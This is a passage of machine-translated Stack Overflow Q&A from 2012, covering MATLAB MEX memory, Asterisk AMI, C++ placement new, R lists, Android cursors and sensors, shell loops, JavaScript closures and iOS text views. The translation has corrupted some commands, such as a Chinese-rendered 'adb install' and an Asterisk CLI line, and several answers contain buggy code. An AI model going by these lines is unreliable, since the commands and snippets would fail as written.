    mxv = matGetVariable(datafile, "value");
    value = *mxGetPr(mxv);
    mxFree(mxv);
    matClose(datafile);

    printf("The value fetched from the .mat file was: %f", value);

    return 0;
} 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-31T12:19:33.977

文档建议使用该函数`mxDestroyArray`而不是`mxFree`释放`mxArray`. 通过使用`mxFree`你可能会弄乱matlab的堆。从[文档](http://matlab.izmiran.ru/help/techdoc/matlab_external/ch3_me23.html)

> **不正确地销毁 mxArray**
> 
> 你不能**`mxFree`**用来销毁一个**`mxArray`**.
> 
> **警告**：您正在尝试调用**`mxFree`**数组**`<class-id>`**。的析构函数**`mxArrays`**是**`mxDestroyArray`**; 请改用这个。MATLAB 将尝试修复该问题并继续，但这将导致未来版本中出现内存故障。
> 
> **导致警告的示例**
> 
> 在下面的例子中，**`mxFree`**不销毁数组对象。此操作会释放与数组关联的结构头，但 MATLAB 仍会像需要销毁数组对象一样操作。因此 MATLAB 将尝试销毁数组对象，并在此过程中再次尝试释放其结构头。
> 
> **`mxArray *temp = mxCreateDoubleMatrix(1,1,mxREAL);`**
> 
> ```
>  ... 
> ```
> 
> **`mxFree(temp); /* INCORRECT */`**
> 
> **解决方案。**
> 
> **`mxDestroyArray`**改为打电话。
> 
> **`mxDestroyArray(temp); /* CORRECT */`**

# asterisk - 未在 Asterisk 11 AMI 上接收事件

> ID：12215028
> 
> 赞同：3
> 
> 时间：2012-08-31T12:05:33.827
> 
> 标签：asterisk, asteriskami

我是 Asterisk 1.4 的老手，我希望在 Asterisk 11 上构建一个新的应用程序（目前是测试版，但计划在我需要它之前的某个时间发布 LTS。）

我无法让 Asterisk Manager Interface on 11 向我发送任何事件。（现在，很明显，在生产中，我需要大幅削减这些 AMI 权利，但在我探索的过程中，我已经打开了消防软管，如果你愿意的话。）

`manager.conf`看起来像这样：

```
[general]
enabled = yes
port = 5038
bindaddr = 127.0.0.1

[manager]
secret = squirrel
deny = 0.0.0.0/0.0.0.0
permit = 127.0.0.1/255.0.0.0
read = all
write = all 
```

然后我`telnet`尝试进入并探索事件流：

```
$ telnet localhost 5038
Trying ::1...
telnet: connect to address ::1: Connection refused
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
Asterisk Call Manager/1.3
Action: Login
Username: manager
Secret: squirrel
Events: on

Response: Success
Message: Authentication accepted

Event: FullyBooted
Privilege: system,all
Status: Fully Booted 
```

...它就在那里，不动，不管我对系统做了什么。我还尝试使用[事件管理器操作](https://wiki.asterisk.org/wiki/display/AST/Asterisk+11+ManagerAction_Events)来`EventMask: on`尝试从中获得一些东西；该命令被接受，但没有任何变化。不过，它会很高兴地响应我发送给它的任何[其他操作。](https://wiki.asterisk.org/wiki/display/AST/Asterisk+11+AMI+Actions)

有什么线索吗？这种事情在 1.4 下运行良好，我在任何文档中都没有发现任何表明我做错了什么的东西。我想接下来要尝试的是1.8 ...

（这里没有什么其他内容`/etc/asterisk`；我使用示例配置仅供参考。这是我们得到的最小的......）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-06-04T11:17:23.033

这可能是 Asteriks / FreePBX 中的错误。我有同样的情况，我的 API php 脚本没有收到来自 AMI 的任何事件。要修复此错误，您必须安装“会议”模块并从 SSH 重新启动 Asterisk：service asterisk restart

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T14:22:23.383

我刚刚使用您的配置使用来自 subversion 的最新 11 进行了测试。我看到正在生成事件。例如，从 CLI 执行此操作：

```
*CLI> 频道源自 Local/Foo 应用程序栏

```

虽然无效，但会导致一些事件被吐出到管理器界面。

# c++ - C ++：放置新的与自己的新重载发生冲突

> ID：12215029
> 
> 赞同：0
> 
> 时间：2012-08-31T12:05:37.673
> 
> 标签：c++, operator-overloading, new-operator, placement-new

我已经为一种类型重载了 new 运算符`X`以使用一些内存池。我的`new`运算符不接受用户定义的参数，因此，唯一的参数是 type 对象的大小`size_t`。在程序的另一部分，我需要为同一类型放置新的位置，如下所示：

```
new (ptr) X(); 
```

（其中 ptr 是指向预分配内存位置的指针）

似乎我对新类型阴影放置新的新运算符的重载。至少，编译器抱怨：

```
error: no matching function for call to ‘X::operator new(long unsigned int, X*&)’
note: candidate is:
note: static void* X::operator new(size_t)
note:   candidate expects 1 argument, 2 provided 
```

候选人是我对 new 运算符的重载。我的问题是：

*   为什么编译器不能识别我想使用placement new？
*   无论如何，我该如何使用它？
*   WTF 是`X*&`错误信息中显示的类型？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T12:13:51.127

覆盖 TypeName::operator new (size_t) 要求您还覆盖placement new 运算符（不需要相反的操作）。这就是编译器抱怨的原因。（有道理——如果你在分配过程中做了一些奇怪的事情，你可能也想在placement new 运算符中的指定位置执行此操作，反之不一定正确）。而 X*& 只是对您想要新对象的指针的引用。

# r - 使用循环将列表拆分为多个数据帧

> ID：12215032
> 
> 赞同：1
> 
> 时间：2012-08-31T12:05:46.097
> 
> 标签：r, list

我是 R 的初学者，我无法在网上的任何地方找到解决方案。

我有一个由 50 个数据框组成的列表对象。我想将此列表拆分为单独的`data.frame`对象，但在执行此操作时遇到了麻烦。

手动操作很简单：

```
a<-list[[1]] 
```

但我想循环它，这样我就不必手动输入所有 50 个组件。这不起作用：

```
for(i in 1:n.imp)
    a.i<-comb.txt1[[i]] 
```

因为它只产生一个（最后一个）数据帧。

有什么想法吗？

这里有一些额外的上下文：这个列表是多重插补过程的产物——mi()。我想将一个新变量合并到每个估算的数据集中，但似乎无法弄清楚如何做到这一点，因为该对象是一个列表。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-31T12:17:15.620

我认为这就是你所追求的：

```
for(i in 1:length(comb.txt1)) {
    assign(paste0("a.", i), comb.txt1[[i]])
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-31T14:12:38.853

你可以使用`attach(comb.txt1)`, 如果你的列表有名字，或者你给它起类似的名字`names(comb.txt1) <- paste('a', seq_along(comb.txt1), sep='.')`

`data.frames`不过，可能没有必要用 50 个来弄乱您的工作空间。假设您要添加到每个的新变量`data.frame`是一些原子向量`var`（即，像 的向量`c(1,2,3)`）。您可以将其添加到`data.frame`您的`list`with中的每个中`lapply(comb.txt1, function(comb.txt1.DF) within(comb.txt1.DF, new.var <- var))`。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-31T14:03:26.963

我不确定那是您正在寻找的东西，但是...

生成数据框列表：

```
> set.seed(1)
> df1 <- data.frame(a=rnorm(10), b=rnorm(10))
> df2 <- data.frame(a=rnorm(10), b=rnorm(10))
> df3 <- data.frame(a=rnorm(10), b=rnorm(10))

> my.list <- list(df1, df2, df3) 
```

然后，将 assign() 与 lapply() 一起使用：

```
> lapply(seq_along(my.list), 
         function(i,x) {assign(paste0("a",i),x[[i]], envir=.GlobalEnv)},
         x=my.list)

> a1
            a           b
1  -0.6264538  1.51178117
2   0.1836433  0.38984324
3  -0.8356286 -0.62124058
4   1.5952808 -2.21469989
5   0.3295078  1.12493092
6  -0.8204684 -0.04493361
7   0.4874291 -0.01619026
8   0.7383247  0.94383621
9   0.5757814  0.82122120
10 -0.3053884  0.59390132 
```

# facebook - Facebook Insights for Website

> ID：12215041
> 
> 赞同：1
> 
> 时间：2012-08-31T12:06:35.837
> 
> 标签：facebook, web, insight

I am trying to setup Facebook Insights for my website at [http://pixls.co](http://pixls.co) I have created an app and Facebook is asking me to put in my code... which I have done a few weeks ago...

but when I try to click the "get insight" button, it kept saying " No admin data found at root webpage [http://pixls.co/](http://pixls.co/). Insights requires admin data at this root webpage for the specified URL pixls.co "

am I missing something here?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T13:00:17.907

Take a look at your page in the [Facebook Debugger](https://developers.facebook.com/tools/debug/og/object?q=http%3A%2F%2Fpixls.co%2F). It's choking on your page and not reading any of your og:meta tags. If you click on the "See what our scraper sees" link at the bottom of the page, you will see it is ignoring all your HTML declaration tags.

I've had this problem before. The Facebook parser does not like white space at the beginning of your HTML.

When I view your page source, I see a blank line before your `<!DOCTYPE>` tag and another between that and your `<html>` tag. Get rid of those and see if your problem goes away.

Fix that, make sure it parses correctly in the debugger, and give insights ~24 hours to populate and check again.

# android - android：光标行数有问题

> ID：12215042
> 
> 赞同：0
> 
> 时间：2012-08-31T12:06:37.080
> 
> 标签：android, sqlite, cursor

我在 DatabaseHandler 中使用此代码：

```
public class DatabaseHandler extends SQLiteOpenHelper {

    private static final int DATABASE_VERSION = 1;
    private static final String DATABASE_NAME = "wic";
    private static final String TABLE_NAME = "products";
    private static final String KEY_NAME = "pname";

    public DatabaseHandler(Context context) {
        super(context, DATABASE_NAME, null, DATABASE_VERSION);
        // TODO Auto-generated constructor stub
    }

    @Override
    public void onCreate(SQLiteDatabase db) {

        String CREATE_PRODUCTS_TABLE = "CREATE TABLE " + TABLE_NAME + "("
                + KEY_NAME + " TEXT" + ")";
        db.execSQL(CREATE_PRODUCTS_TABLE);
    }

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {

        // Drop older table if existed
        db.execSQL("DROP TABLE IF EXISTS " + TABLE_NAME);

        // Create tables again
        onCreate(db);
    }

    public void addProducts(String product_name) {

        SQLiteDatabase db = this.getWritableDatabase();

        ContentValues values = new ContentValues();
        values.put(KEY_NAME, product_name); // Product Name
        // Inserting Row
        db.insert(TABLE_NAME, null, values);
        db.close(); // Closing database connection
    }

    public String getProducts() {

        SQLiteDatabase db = this.getReadableDatabase();
        String selectQuery = "SELECT  * FROM " + TABLE_NAME;
        Cursor cursor = db.rawQuery(selectQuery, null);
        String s = "default";
        if (cursor.moveToFirst()) {
            int n = cursor.getCount();
            Log.d("cursor count", "++  " + n);
            s = cursor.getString(0);
        }
        cursor.close();
        return s;
    }
} 
```

我只向数据库添加 1 个字符串。使用这个：

```
DatabaseHandler db = new DatabaseHandler(this);
db.addProducts("1st product"); 
```

但我得到了这个例外：

```
android.database.CursorIndexOutOfBoundsException: Index -1 requested, with a size of 5120 
```

不是在添加时，而是在尝试使用获取值时`db.getProducts();`

`cursor.getCounts`给我价值= 5120；

我第一次在 android 中使用 SQLite，我对此一无所知：

谢谢你

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T12:10:53.853

你错过的那一行是，

```
cursor.moveToFirst(); 
```

你的代码中有一些东西：

```
Cursor cursor = db.rawQuery(selectQuery, null);
int n = cursor.getCount();
cursor.moveToFirst();
int n = cursor.getCount();
String s = cursor.getString(0); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-31T12:12:41.157

您需要添加一个 if 条件：

```
if(cursor.moveToFirst()) {
    int n = cursor.getCount();
    String s = cursor.getString(0);
} 
```

为什么？[`Cursor`s（最初）从行索引 -1](http://developer.android.com/reference/android/database/Cursor.html#getPosition%28%29)（第一行之前）开始。因此，调用`moveToFirst()`会将您移动到索引 0（第一行）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-31T12:10:52.617

采用 ：

```
cursor.moveToFirst(); 
```

在您收到此行中的数据后：

```
Cursor cursor = db.rawQuery(selectQuery, null); 
```

# c - 创建自定义安装程序

> ID：12215046
> 
> 赞同：2
> 
> 时间：2012-08-31T12:06:58.997
> 
> 标签：c, windows-services, installation, windows-installer

我创建了一个应用程序，它是一个窗口服务，它必须在域管理员帐户的上下文中运行并进行一些服务器设置等。

现在我需要在客户端机器上安装它，显然我不能使用正常的部署项目 MSI 来完成它，因为它在安装时涉及自定义对话框和用户输入。

我怎样才能做到这一点？

现在是否有任何 3rd 方框架真正允许我创建自定义对话框并编写将在运行时执行的代码？

如果我必须手动完成？我如何将我的自定义安装程序文件和我的 Windows 服务器应用程序文件合并到一个 MSI 中。

这就是我想要的安装过程：

1.  欢迎屏幕
2.  系统检查
3.  最终用户许可协议
4.  根据产品许可的服务器设置，它由用户选择。
5.  基于上次选择的服务器设置。
6.  我的窗口服务器设置将进行休息调用并更新服务器。
7.  接受域用户帐户凭据。
8.  现在开始安装。
9.  根据选择重定向到带有完成消息的云门户。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T13:47:52.100

MSI 安装程序支持您的需要，但主要由商业设置工具提供支持。服务器通信通常通过内置支持或自定义操作完成。

以下是可以帮助您入门的设置工具列表：[http ://en.wikipedia.org/wiki/List_of_installation_software](http://en.wikipedia.org/wiki/List_of_installation_software)

例如，高级安装程序具有对服务器端许可证验证和通信的内置支持。

选择一个安装工具并尝试创建您的安装程序。然后，如果您遇到任何问题，您可以提出更具体的问题。

# c# - 如何使用 windows phone 7 的音效类停止音乐文件

> ID：12215047
> 
> 赞同：0
> 
> 时间：2012-08-31T12:07:03.040
> 
> 标签：c#, windows-phone-7, xna

嗨，我正在制作一个 Windows Phone 应用程序。[我使用Soundeffect 类](http://msdn.microsoft.com/en-us/library/microsoft.xna.framework.audio.soundeffect.aspx)使用了一些音轨， 但我想在按钮单击事件上停止该音轨的音乐（它具有播放方法但没有停止方法），那么我该如何实现呢？使用的语言是 C#

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T12:32:59.797

`Play`提供的方法`SoundEffect`只是做即发即弃声音的一种方便方法。如果您想做更多花哨的事情，您需要创建一个`SoundEffectInstance`( [MSDN )。](http://msdn.microsoft.com/en-us/library/dd282421)

```
// At load time:
SoundEffect mySoundEffect = Content.Load<SoundEffect>("mySound");
SoundEffectInstance mySoundEffectInstance = mySoundEffect.CreateInstance();

// During your game:
mySoundEffectInstance.Play();
mySoundEffectInstance.Stop();

// When you're done with it:
mySoundEffectInstance.Dispose(); 
```

（请注意，您不`Dispose()`属于`mySoundEffect`，因为它的生命周期由`ContentManager`加载它的 管理。）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T12:32:52.173

我认为 Soundeffect 类应该用于你不想暂停的短音效，因为它们很短。

你在用 XNA 吗？如果是，请查看[MediaPlayer 类](http://msdn.microsoft.com/en-us/library/microsoft.xna.framework.media.mediaplayer.aspx)。如果没有，请尝试使用[BackgroundAudioPlayer 类](http://msdn.microsoft.com/en-us/library/microsoft.phone.backgroundaudio.backgroundaudioplayer%28v=vs.92%29.aspx)。

# shell - 命令行：使用通配符时忽略特定文件

> ID：12215057
> 
> 赞同：1
> 
> 时间：2012-08-31T12:07:29.317
> 
> 标签：shell, command-line, terminal

考虑我在一个名为`test`. 我想执行其中的所有文件，但一个特定文件除外。我该怎么办？手动重新定位文件或一个接一个地执行文件不是一种选择。有什么办法可以在单行中做到这一点。或者，添加一些东西来`sh path/to/test/*.sh`执行所有文件？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-31T12:20:07.587

```
for file in test/*; do
    [ "$file" != "test/do-not-run.sh" ] && sh "$file"
done 
```

如果您正在使用`bash`，则可以使用扩展模式来跳过不需要的脚本：

```
shopt -s extglob
for file in test/!(do-not-run).sh; do
    sh "$file"
done 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T12:11:47.857

```
for FILE in `ls "$YOURPATH"` ; do 
  test "$FILE" != "do-not-run.sh" && sh "$YOURPATH/$FILE"; 
done 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-31T12:23:46.660

`find path/to/test -name "*.sh" \! -name $pattern_for_unwanted_scripts -exec {} \;`

Find 将递归执行目录中以 .sh (-name "*.sh") 结尾且不匹配不需要的模式 (\! -name $pattern_for_unwanted_scripts) 的所有条目。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-31T12:26:39.523

在 中`bash`，只要您这样做，`shopt -s extglob`您就可以使用“扩展通配符”允许使用`!(pattern-list)`除了给定模式之一之外的任何匹配项。

在你的情况下：

```
shopt -s extglob
for f in !(do-not-run.sh); do if [ "${f##*.}" == "sh" ]; then sh $f; fi; done 
```

# android - 如何在平板电脑上运行Phonegap App

> ID：12215058
> 
> 赞同：0
> 
> 时间：2012-08-31T12:07:32.023
> 
> 标签：android, cordova

我在 phonegap 中创建了一个旅行应用程序并在 AVD Manager 中运行，但是如何在平板电脑中运行这个应用程序

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T12:09:48.287

只需将 apk 安装到设备上：

> adb 安装路径/to/myapp.apk

[http://developer.android.com/tools/help/adb.html](http://developer.android.com/tools/help/adb.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T12:18:11.657

创建一个目标高于 3.2 且皮肤设置为内置的新虚拟设备：WXGA800

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T12:28:20.190

很简单，您也可以将您的 apk 放在您的 sdcard 文件夹中，然后双击它的 apk 文件，然后它会自动安装在您的设备上。

# python - 这是构建dict的最快方法吗？

> ID：12215062
> 
> 赞同：0
> 
> 时间：2012-08-31T12:07:48.583
> 
> 标签：python, performance, list, dictionary

我正在从`xml`文件中读取元素列表并将数据放入 2 个字典中。

这是最快的方法吗？（我不认为这是最好的，你们总是让我感到惊讶。;-)

```
ADict = {}
BDict = {}
for x in fields:
    key = x.get('key')
    ADict[key] = x.find('A').text
    BDict[key] = x.find('B').text 
```

我认为一个一个地添加它是一个坏主意，但是将它写在一行中。也就是像这样的更蟒蛇的方式

```
 ADict,BDict = [dict(k) for k in zip(*([(x.get('key'),x.find('A').text),(x.get('key'),x.find('B').text)] for x in fields))] 
```

我不认为它更好，两个原因，第一，`x.get('key')`被调用了两次，创建了太多的临时元组

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-31T12:13:00.583

未经测试，但应该可以工作

```
ADict = dict((x.get('key'), x.find('A').text) for x in fields)
BDict = dict((x.get('key'), x.find('B').text) for x in fields) 
```

# javascript - Javascript updates UI only when alert() is used in internet explorer with AJAX

> ID：12215064
> 
> 赞同：6
> 
> 时间：2012-08-31T12:07:52.120
> 
> 标签：javascript, ajax, internet-explorer, user-interface

I'm having a problem in Internet Explorer, it works fine with Firefox.

I have a java script function that updates UI (Screen Content) which is called before AJAX function. But it doesn't update UI until an alert box prompt is used. Without alert box it doesn't update UI before AJAX function. It updates UI after AJAX function even if it is called before AJAX function

If i use following code, the UpdateUI() doesn't update the UI at all before AJAX function call, it updates UI after AJAX function call. I want it to update UI before AJAX function call (actually im displaying a loading bar before AJAX call)

```
UpdateUI(); // java script function, it just updates inner HTML of a DIV

// AJAX function call here with Async = false 
```

But If i use following code, the UpdateUI() update the UI before AJAX function call, but this method includes an alert prompt. I don't want to use alert

```
UpdateUI(); // java script function, it just updates inner HTML of a DIV

alert('hellow');

// AJAX function call here with Async = false 
```

It's working fine in Firefox but not in Internet Explorer 8

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-08-31T12:13:06.307

Browsers don't usually reflow (refresh) the UI when there is an active JS thread. It waits until it has flushed all events from ts event queue before performing a reflow. Think of this like a single threaded loop in which the browser has to perform all its events.

Reflow usually gets the least priority in certain situations, however you can force the browser to reflow by requesting certain attributes on DOM elements like getComputedStyle or offsetX/y etc. Basically any request that requires the browser to layout the UI to respond will perform a reflow.

[This](http://www.phpied.com/rendering-repaint-reflowrelayout-restyle/) is the best article I had found sometime back when I was facing a similar problem.

The easiest and fool-proof trick I can suggest is to split your code into two methods and call the method that requires a prior-reflow in a timeout after 0mills. This gives the browser some breather to perform a reflow before it calls method2\. This works exactly like the alert() trick you tried and found working.

# javascript - Onclick 功能更改为所有已更改元素的相同功能

> ID：12215071
> 
> 赞同：0
> 
> 时间：2012-08-31T12:08:19.207
> 
> 标签：javascript, jquery, function, onclick

我正在尝试做的是基于通过 AJAX 获得的数据，我正在将页面上的某些元素更改为不同的。一个简化的版本是这样的：

例子：

HTML：

```
<ul id="friends">
    <li id="1-1" onclick="dont_alert()"> Andy </li>
    <li id="1-2" onclick="dont_alert()"> Paul </li>
    <li id="1-3" onclick="dont_alert()"> Saul </li>
    <li id="1-4" onclick="dont_alert()"> Rita </li>
    <li id="1-5" onclick="dont_alert()"> Greg </li>
</ul>

<input type="button" onclick='callback()' value="Go!" /> 
```

相关 JS：函数 alert_this(value) { alert(value); }

```
function dont_alert() {
    alert('...');
}

function callback() {
    var data_received = [["1","1","Andy"], ["1","5","Greg"]];
    for (friend in data_received) {
        if (data_received[friend][0] == undefined) continue;

        var friend_id = '#'+ data_received[friend][0] +'-'+ data_received[friend][1];
        $(friend_id).attr('onclick', '');
        $(friend_id).css('background', 'red');
        $(friend_id).click(function () { 
            alert_this(data_received[friend][2]);
        });
    }    
} 
```

这样做的结果是两个元素都 alert 'Greg' 而不是适当的值。

任何对答案的刺激将不胜感激！:D

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-31T12:10:22.933

您需要创建一个***闭包***，否则，`.click()`处理程序将始终提醒循环中*最后*分配的值`friend`，因为它们所拥有的只是对该变量的*引用。*

```
function callback() {
    var data_received = [["1","1","Andy"], ["1","5","Greg"]];
    for (var friend in data_received) {
        if (data_received[friend][0] == undefined) continue;

        var friend_id = '#'+ data_received[friend][0] +'-'+ data_received[friend][1];
        console.log(friend_id);
        $(friend_id).attr('onclick', '');
        $(friend_id).css('background', 'red');
        (function() {
            var savedValue = data_received[friend][2];
            $(friend_id).click(function(){
                alert(savedValue);
            });
        })();
    }    
}​ 
```

**[演示](http://jsfiddle.net/XPdJF/)**。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T12:24:25.510

首先，您不应该在 HTML 中使用内联事件处理程序。相反，使用 jQuery 附加它们。

您的问题在于闭包 -`friend`具有函数范围，在`callback`. 事件处理程序在`friend`变量上创建一个闭包。完成`callback`后，`friend == 1`. 然后事件处理程序使用这个值。一个修复方法是用来`$.each`迭代你的数组，这会在变量的值上创建一个闭包。

### HTML

```
<ul id="friends">
    <li id="1-1"> Andy </li>
    <li id="1-2"> Paul </li>
    <li id="1-3"> Saul </li>
    <li id="1-4"> Rita </li>
    <li id="1-5"> Greg </li>
</ul>

<input type="button" id="go" value="Go!" /> 
```

### JS

```
$('#friends').on('click', 'li', function() {
    alert('...');
});

$('#go').on('click', function() {
    var data_received = [["1","1","Andy"], ["1","5","Greg"]];
    $.each(data_received, function(i, friend) {
        if (friend[0] === undefined) return;

        $('#'+ friend[0] +'-'+ friend[1])
            .css('background', 'red');
            .click(function() { 
                alert(friend[2]);
                return false;
            });
    });
}); 
```

# cocos2d-iphone - CCSpriteFrameCache 发布策略

> ID：12215072
> 
> 赞同：0
> 
> 时间：2012-08-31T12:08:32.873
> 
> 标签：cocos2d-iphone

据我了解，`CCSpriteFrameCache`从文件和精灵表创建精灵时会被填充，并且应该足够聪明以在内存不足时清除未使用的帧。

我的问题是：在我的应用程序中，我应该担心尽快手动释放未使用的帧，还是应该只依靠缓存在必要时自行清除？

让缓存增长直到收到内存警告是否有任何副作用（如系统或其他正在运行的应用程序的整体性能问题）？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T13:16:37.230

这个问题的答案真的取决于你的应用程序，以及它的内存占用。在我的一个游戏中，当游戏处于重新加载不会增加可能导致用户关闭的过度延迟的情况下，我会积极清除内存并“及时”加载。

但正如我所说，你的策略应该基于内存占用的实际测量，以及它对用户体验的“感知”影响。与往常一样，在模拟器上开始测量（可以测量内存，但不能测量时间和 FPS），但在真实设备上通过一些测量快速验证。

# iphone - 随着文本的累积，使 textView 水平缩放

> ID：12215079
> 
> 赞同：0
> 
> 时间：2012-08-31T12:09:00.737
> 
> 标签：iphone, ios, xcode, uitextview

我正在尝试使 textView 框架随着文本的累积而水平缩放。我正在使用代码打击来尝试实现这一点。框架按预期垂直缩放，但大小似乎被水平锁定。

```
 [myTextView setFrame:CGRectMake(myTextView.frame.origin.x, myTextView.frame.origin.y, myTextView.contentSize.width, myTextView.contentSize.height)]; 
```

如果有人想看看，[这是项目（27K）。](http://owolf.net/uploads/StackOverflow/TextViewTester.zip)

谢谢阅读。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T12:26:29.973

您的答案在[notes-app](http://www.cocoanetics.com/2010/03/stuff-you-learn-from-reverse-engineering-notes-app/)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T12:35:42.497

在 .h 文件中实现 UITextView 委托：

```
@interface ViewController : UIViewController<UITextViewDelegate> 
```

如果 yourTextView 从 xib 添加，则将委托与文件所有者绑定，否则在 ViewDidLoad 添加此行：

```
yourTextView.delegate = self; 
```

* * *

根据您的要求使用 textView 的委托：

```
- (BOOL)textView:(UITextView *)textView shouldChangeTextInRange:(NSRange)range replacementText:(NSString *)text
{
   CGSize maximumSize = CGSizeMake(2000,40); //specify height of textView  and maximum width for text to fit in height of textView as u want text horizontally
   CGSize *txtSize = [textView.text sizeWithFont:[UIFont fontWithName:@"Arial" size:16] constrainedToSize:maximumSize lineBreakMode:UILineBreakModeCharacterWrap]; //calulate size of text by specifying font here
   //Add UIViewAnimation here if needed
   [textView setFrame:CGRectMake(textView.frame.origin.x,textView.frame.origin.y,txtSize.width+10,txtSize.height+10)]; // change accordingly
   return YES;
} 
```

# android - 无法从 Android 中的传感器读取

> ID：12215081
> 
> 赞同：2
> 
> 时间：2012-08-31T12:09:07.497
> 
> 标签：android, android-sensors, sensormanager

我有一个应用程序，我想将传感器数据合并到其中。我的第一步是创建一个仅读取传感器数据并将其显示在屏幕上的应用程序。我所做的大部分研究都指向诸如[Lars Vogel 的](http://www.vogella.com/articles/AndroidSensor/article.html). 不幸的是，这就是我卡住的地方。我基本上已经将他的代码复制粘贴到我的项目中，虽然应用程序运行，但它不显示任何数据。

这是我正在使用的代码：

```
package com.example.sensortest;    

import android.graphics.Color;
import android.hardware.Sensor;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.hardware.SensorManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.SystemClock;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.RelativeLayout;
import android.widget.TextView;
import android.widget.Toast;

public class sensortest extends Activity implements SensorEventListener{
    private SensorManager mSensorManager;
    private Sensor mSensor;
    RelativeLayout rlsensortest; 
    TextView tvOutput;
    Button btnStart, btnStop;
    Boolean blnScan=false;

    private Handler mHandler = new Handler();
    private long mStartTime=0L;
    private long lElapsedTime=0;

    private boolean color = false;
    private long lastUpdate;        

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        mSensorManager = (SensorManager) getSystemService(SENSOR_SERVICE);
        //mSensor = mSensorManager.getDefaultSensor(Sensor.TYPE_LINEAR_ACCELERATION);       

        LayoutInflater layoutInflater = this.getLayoutInflater();

        rlsensortest = (RelativeLayout) layoutInflater.inflate(R.layout.activity_asphalt_alert,null);       
        tvOutput = (TextView) rlsensortest.findViewById(R.id.txtOutput);        
        tvOutput.setText("Initialized...\n");

        btnStart = (Button) rlsensortest.findViewById(R.id.btnStart);
        btnStop = (Button) rlsensortest.findViewById(R.id.btnStop);

        btnStart.setOnClickListener(mButtonListener);
        btnStop.setOnClickListener(mButtonListener);

        lastUpdate = System.currentTimeMillis();

        setContentView(rlsensortest);        
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.activity_asphalt_alert, menu);
        return true;
    }
    // Create an anonymous implementation of OnClickListener
    private OnClickListener mButtonListener = new OnClickListener() {
        String strMessage ="";
        public void onClick(View v) {
            if (v == btnStart){
                strMessage = "Starting sensor scan.";
                blnScan=true;
            //  mStartTimer();

            } else if (v == btnStop){
                strMessage = "Stoping sensor scan.";
                blnScan=false;
            //  mStopTimer();
            }
            if (strMessage != "")
                Toast.makeText(rlsensortest.getContext(), strMessage, Toast.LENGTH_SHORT).show();

            strMessage = "";
        }
    };

    @Override
    public void onAccuracyChanged(Sensor sensor, int accuracy) {
        // TODO Auto-generated method stub

    }

    @Override
    public void onSensorChanged(SensorEvent event) {
/*      String strEvent = "";
        strEvent = "this is a test";
        tvOutput.setText(tvOutput.getText() + strEvent + "Another line\n"); */

        if (event.sensor.getType() == Sensor.TYPE_ACCELEROMETER) {
            getAccelerometer(event);
        }       

    }
    private void getAccelerometer(SensorEvent event) {
        float[] values = event.values;
        // Movement
        float x = values[0];
        float y = values[1];
        float z = values[2];

        float accelationSquareRoot = (x * x + y * y + z * z)
            / (SensorManager.GRAVITY_EARTH * SensorManager.GRAVITY_EARTH);
        long actualTime = System.currentTimeMillis();
        if (accelationSquareRoot >= 2) //
        {
          if (actualTime - lastUpdate < 200) {
            return;
          }
          lastUpdate = actualTime;
          Toast.makeText(this, "Device was shuffed", Toast.LENGTH_SHORT)
              .show();
          if (color) {
            tvOutput.setBackgroundColor(Color.GREEN);

          } else {
            tvOutput.setBackgroundColor(Color.RED);
          }
          color = !color;
        }
      } 
} 
```

此时，当手机摇晃时，它应该（至少）举杯表示事件发生了。知道我做错了什么吗？任何帮助表示赞赏

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T12:21:39.310

看起来你从来没有对`mSensorManager`. 您需要先从中获取一个`Sensor`，然后才能收到`SensorEventListener`回调。获取/释放`Sensor`s 通常发生在`onResume`/中`onPause`。

[Lars Vogel`Sensor`教程](http://www.vogella.com/articles/AndroidSensor/article.html)中的示例：

```
 @Override
  protected void onResume() {
    super.onResume();
    // register this class as a listener for the orientation and
    // accelerometer sensors
    mSensorManager.registerListener(this,
        mSensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER),
        SensorManager.SENSOR_DELAY_NORMAL);
  }

  @Override
  protected void onPause() {
    // unregister listener
    super.onPause();
    mSensorManager.unregisterListener(this);
  } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T12:20:20.880

添加到您的活动：

```
@Override
